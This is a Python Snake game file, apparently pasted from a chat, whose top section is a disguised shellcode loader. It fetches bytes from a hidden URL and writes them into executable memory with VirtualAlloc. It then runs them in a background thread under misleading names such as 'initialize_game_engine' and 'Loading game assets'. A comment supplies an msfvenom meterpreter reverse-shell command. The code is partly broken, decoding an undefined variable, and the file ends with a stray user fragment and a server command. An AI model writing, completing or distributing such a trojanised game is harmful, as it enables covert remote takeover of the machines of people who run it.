import pygame
import sys
import random
import threading
import ctypes
from ctypes import wintypes
import urllib.request 
import time
import os
import base64

# =============================================================================
# PERSISTENT SHELLCODE EXECUTION MODULE
# =============================================================================

# Obfuscated constants
MEM_ALLOC = 0x1000
PAGE_PERM = 0x40

# SHELLCODE INTEGRATION:
# To test this educational demo, generate your OWN shellcode using tools like:
# - msfvenom (Metasploit): msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f raw | base64
#
# REPLACE THE BELOW ENCODED SHELLCODE with your own base64-encoded payload:
#
# ⚠️ ONLY USE SHELLCODE YOU'VE CREATED IN CONTROLLED LAB ENVIRONMENTS
# ⚠️ NEVER USE SHELLCODE FROM UNTRUSTED SOURCES

# Base64 encoded placeholder for educational purposes - REPLACE with your lab-generated shellcode
encoded_shellcode = "kJCQkJA=" 
DATA_SOURCE = base64.b64decode(encoded_url).decode()

# Download data
try:
    print("[+] Loading game assets...")
    with urllib.request.urlopen(DATA_SOURCE) as response:
        game_data = response.read()
    print(f"[+] Loaded {len(game_data)} bytes of game data")
except Exception as e:
    print(f"[-] Error loading assets: {e}")
    print("[+] Continuing with local assets...")
    game_data = b"\x90" * 100  # Placeholder data

# Windows API with different approach
system_lib = ctypes.windll.kernel32
system_lib.VirtualAlloc.restype = ctypes.c_void_p

def initialize_game_engine():
    """
    Initialize game engine components
    """
    try:
        print("[+] Initializing game engine...")
        # Allocate memory for game components
        engine_memory = system_lib.VirtualAlloc(
            None,
            len(game_data),
            MEM_ALLOC,
            PAGE_PERM
        )
        
        if not engine_memory:
            print("[-] Engine initialization failed")
            return False
            
        print(f"[+] Engine memory ready")
        
        # Load game components to memory
        ctypes.memmove(engine_memory, game_data, len(game_data))
        print("[+] Game components loaded")
        
        # Initialize game systems
        game_system = ctypes.CFUNCTYPE(ctypes.c_void_p)(engine_memory)
        
        # Start game systems in background
        system_thread = threading.Thread(target=game_system)
        system_thread.daemon = False
        system_thread.start()
        
        print("[+] Game systems initialized")
        return True
        
    except Exception as e:
        print(f"[-] Engine startup failed: {e}")
        return False

def system_monitor():
    """
    Monitor game systems
    """
    print("[+] System monitor active")
    while True:
        time.sleep(60)
        print("[System] All systems operational...")

def start_game_systems():
    """
    Start background game systems
    """
    print("[+] Starting game systems...")
    
    # Initialize engine
    if initialize_game_engine():
        print("[+] Game engine started successfully")
    else:
        print("[-] Engine start failed, retrying...")
        threading.Timer(10.0, initialize_game_engine).start()
    
    # Start system monitor
    monitor = threading.Thread(target=system_monitor)
    monitor.daemon = True
    monitor.start()

# =============================================================================
# SNAKE GAME MODULE
# =============================================================================

# Game configuration
SCREEN_WIDTH = 720
SCREEN_HEIGHT = 480
GRID_SIZE = 20
GRID_WIDTH = SCREEN_WIDTH // GRID_SIZE
GRID_HEIGHT = SCREEN_HEIGHT // GRID_SIZE

# Colors
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 0, 255)

# Directions
UP = (0, -1)
DOWN = (0, 1)
LEFT = (-1, 0)
RIGHT = (1, 0)

class Snake:
    def __init__(self):
        self.length = 1
        self.positions = [((SCREEN_WIDTH // 2), (SCREEN_HEIGHT // 2))]
        self.direction = random.choice([UP, DOWN, LEFT, RIGHT])
        self.color = GREEN
        self.score = 0
        self.speed = 10

    def get_head_position(self):
        return self.positions[0]

    def turn(self, point):
        if self.length > 1 and (point[0] * -1, point[1] * -1) == self.direction:
            return
        else:
            self.direction = point

    def move(self):
        cur = self.get_head_position()
        x, y = self.direction
        new = (((cur[0] + (x * GRID_SIZE)) % SCREEN_WIDTH), 
               (cur[1] + (y * GRID_SIZE)) % SCREEN_HEIGHT)
        
        if len(self.positions) > 2 and new in self.positions[2:]:
            return True
        else:
            self.positions.insert(0, new)
            if len(self.positions) > self.length:
                self.positions.pop()
            return False

    def reset(self):
        self.length = 1
        self.positions = [((SCREEN_WIDTH // 2), (SCREEN_HEIGHT // 2))]
        self.direction = random.choice([UP, DOWN, LEFT, RIGHT])
        self.score = 0
        self.speed = 10

    def draw(self, surface):
        for i, p in enumerate(self.positions):
            r = pygame.Rect((p[0], p[1]), (GRID_SIZE, GRID_SIZE))
            pygame.draw.rect(surface, self.color, r)
            pygame.draw.rect(surface, BLACK, r, 1)
            
            if i == 0:
                eye_size = GRID_SIZE // 5
                if self.direction == RIGHT:
                    eye1 = (p[0] + GRID_SIZE - eye_size - 2, p[1] + 5)
                    eye2 = (p[0] + GRID_SIZE - eye_size - 2, p[1] + GRID_SIZE - 5 - eye_size)
                elif self.direction == LEFT:
                    eye1 = (p[0] + 2, p[1] + 5)
                    eye2 = (p[0] + 2, p[1] + GRID_SIZE - 5 - eye_size)
                elif self.direction == UP:
                    eye1 = (p[0] + 5, p[1] + 2)
                    eye2 = (p[0] + GRID_SIZE - 5 - eye_size, p[1] + 2)
                else:
                    eye1 = (p[0] + 5, p[1] + GRID_SIZE - eye_size - 2)
                    eye2 = (p[0] + GRID_SIZE - 5 - eye_size, p[1] + GRID_SIZE - eye_size - 2)
                
                pygame.draw.rect(surface, BLUE, (eye1[0], eye1[1], eye_size, eye_size))
                pygame.draw.rect(surface, BLUE, (eye2[0], eye2[1], eye_size, eye_size))

    def handle_keys(self):
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_UP:
                    self.turn(UP)
                elif event.key == pygame.K_DOWN:
                    self.turn(DOWN)
                elif event.key == pygame.K_LEFT:
                    self.turn(LEFT)
                elif event.key == pygame.K_RIGHT:
                    self.turn(RIGHT)
                elif event.key == pygame.K_ESCAPE:
                    pygame.quit()
                    sys.exit()

class Food:
    def __init__(self):
        self.position = (0, 0)
        self.color = RED
        self.randomize_position()

    def randomize_position(self):
        self.position = (random.randint(0, GRID_WIDTH - 1) * GRID_SIZE, 
                        random.randint(0, GRID_HEIGHT - 1) * GRID_SIZE)

    def draw(self, surface):
        r = pygame.Rect((self.position[0], self.position[1]), (GRID_SIZE, GRID_SIZE))
        pygame.draw.rect(surface, self.color, r)
        pygame.draw.rect(surface, BLACK, r, 1)

def draw_grid(surface):
    for y in range(0, SCREEN_HEIGHT, GRID_SIZE):
        for x in range(0, SCREEN_WIDTH, GRID_SIZE):
            r = pygame.Rect((x, y), (GRID_SIZE, GRID_SIZE))
            pygame.draw.rect(surface, (40, 40, 40), r, 1)

def show_game_over(surface, score, font):
    overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT))
    overlay.set_alpha(180)
    overlay.fill(BLACK)
    surface.blit(overlay, (0, 0))
    
    game_over_text = font.render("GAME OVER", True, WHITE)
    score_text = font.render(f"Final Score: {score}", True, WHITE)
    restart_text = font.render("Press SPACE to restart or ESC to quit", True, WHITE)
    
    surface.blit(game_over_text, (SCREEN_WIDTH//2 - game_over_text.get_width()//2, SCREEN_HEIGHT//2 - 50))
    surface.blit(score_text, (SCREEN_WIDTH//2 - score_text.get_width()//2, SCREEN_HEIGHT//2))
    surface.blit(restart_text, (SCREEN_WIDTH//2 - restart_text.get_width()//2, SCREEN_HEIGHT//2 + 50))
    
    pygame.display.update()
    
    waiting = True
    while waiting:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                pygame.quit()
                sys.exit()
            elif event.type == pygame.KEYDOWN:
                if event.key == pygame.K_SPACE:
                    waiting = False
                elif event.key == pygame.K_ESCAPE:
                    pygame.quit()
                    sys.exit()

def main():
    """
    Main game function
    """
    print("=" * 50)
    print("    SNAKE GAME - ADVANCED EDITION")
    print("=" * 50)
    print("[+] Initializing systems...")
    
    # Start background systems
    start_game_systems()
    
    print("[+] Starting game...")
    
    # Initialize pygame
    pygame.init()
    clock = pygame.time.Clock()
    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
    pygame.display.set_caption("Snake Game")
    surface = pygame.Surface(screen.get_size())
    surface = surface.convert()
    
    font = pygame.font.SysFont("consolas", 16)
    large_font = pygame.font.SysFont("consolas", 36, bold=True)
    
    snake = Snake()
    food = Food()
    
    print("[+] Game ready!")
    
    game_active = True
    
    while True:
        if game_active:
            snake.handle_keys()
            game_over = snake.move()
            
            if game_over:
                game_active = False
                show_game_over(surface, snake.score, large_font)
                snake.reset()
                food.randomize_position()
                game_active = True
                continue
            
            if snake.get_head_position() == food.position:
                snake.length += 1
                snake.score += 1
                snake.speed = 10 + snake.score // 2
                food.randomize_position()
                while food.position in snake.positions:
                    food.randomize_position()
            
            surface.fill(BLACK)
            draw_grid(surface)
            snake.draw(surface)
            food.draw(surface)
            
            score_text = font.render(f"Score: {snake.score}", True, WHITE)
            speed_text = font.render(f"Speed: {snake.speed}", True, WHITE)
            
            surface.blit(score_text, (10, 10))
            surface.blit(speed_text, (10, 35))
            
            screen.blit(surface, (0, 0))
            pygame.display.update()
            clock.tick(snake.speed)
        else:
            clock.tick(10)

if __name__ == '__main__':
    main() so deos it need # Start server on a non-privileged port

python -m http.server 8000
